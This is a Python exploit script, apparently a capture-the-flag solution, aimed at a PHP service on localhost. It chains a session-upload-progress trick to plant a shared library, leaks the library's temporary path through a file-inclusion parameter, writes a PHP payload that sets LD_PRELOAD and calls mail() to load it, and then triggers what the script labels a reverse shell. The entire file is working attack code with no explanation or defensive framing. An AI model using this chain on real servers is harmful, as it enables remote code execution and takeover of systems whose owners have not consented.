import requests

def attack1():
    HOST = 'http://localhost:31337/?chance=$r="a";$r["a"];&mode=chance'
    headers = {
        'Connection': 'close', 
        'Cookie': 'PHPSESSID=pay1',
    }

    data = {'PHP_SESSION_UPLOAD_PROGRESS': 'preloooad'}

    pay = open("pay.so","rb")
    try:
        requests.post(HOST, headers=headers, files={'f':pay}, data=data)
        print("Something is wrong..?")
    except:
        pay.close()
        print("Upload Done")

def attack2(lib):
    HOST = 'http://localhost:31337/'
    headers = {
        'Connection': 'close', 
        'Cookie': 'PHPSESSID=pay2',
    }

    data = {'PHP_SESSION_UPLOAD_PROGRESS': '<?php putenv("LD_PRELOAD=%s"); mail("","","","");?>'%(lib)}
    requests.post(HOST, headers=headers, files={'f':"dummy"}, data=data)
    print("Payload setting done")

def attack3():
    print("Trying reverse shell")
    HOST = 'http://localhost:31337/?bonus=/var/lib/php/sessions/sess_pay2'
    conn = requests.get(HOST)

def leak():
    HOST = 'http://localhost:31337/?bonus=/var/lib/php/sessions/sess_pay1'
    conn = requests.get(HOST)
    parsed = conn.text
    parsed = parsed[parsed.index('/tmp'):]
    parsed = parsed[:parsed.index("\"")]
    return parsed

def exploit():
    attack1()
    lib = leak()
    print("[*] Leak:",lib)
    attack2(lib)
    attack3()

if __name__ == "__main__":
    exploit()
    
